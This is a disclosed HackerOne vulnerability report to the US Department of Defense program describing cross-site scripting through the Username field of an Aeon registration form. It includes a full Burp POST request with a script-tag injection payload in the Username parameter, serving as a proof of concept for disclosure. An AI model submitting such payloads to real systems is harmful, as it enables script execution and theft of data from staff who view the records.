# Parâmetro XSS: Nome de usuário - █████████

## Report Details
- **Report ID**: 2356104
- **URL**: https://hackerone.com/reports/2356104
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-02-05T19:57:47.786Z
- **Disclosed**: 2024-03-22T17:40:22.789Z

## Reporter
- **Username**: chor4o
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi teams,

Burp - Request

█████

In the first video, I demonstrate via burp the capture of get and then I modify it to post and copy the code that I sent in the other reports and send the xss.

Dod-1.mkv

In the video dod-2.mkv I am sending the xss via "POC" poc-dod.html

## Impact

The attacker can steal data from whoever checks the report.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Burp Request

POST /testweb/aeon.dll/css/Aeon.dll HTTP/1.1
Host: ███
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 597

Address=███████&Address2=█████&AeonForm=Registration&City=██████&Country=████&Department=Candidate&EMailAddress=█████████&FORMSTATE=1&FirstName=ghovjnjv&ID=1&IDType=1&LastName=ghovjnjv&NotificationMethod=Email&Password1=u]H[ww6KrA9F.x-F&Password2=u]H[ww6KrA9F.x-F&Phone=███&SAddress=██████&SAddress2=█████████&SCity=██████&SCountry=AF&SState=N/A&SZip=██████████&State=N/A&Status=USMA&SubmitButton=Submit%20Information&Username=ghovjnjv'"()%26%25<zzz><ScRiPt>alert(233)</ScRiPt>&Zip=██████████

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
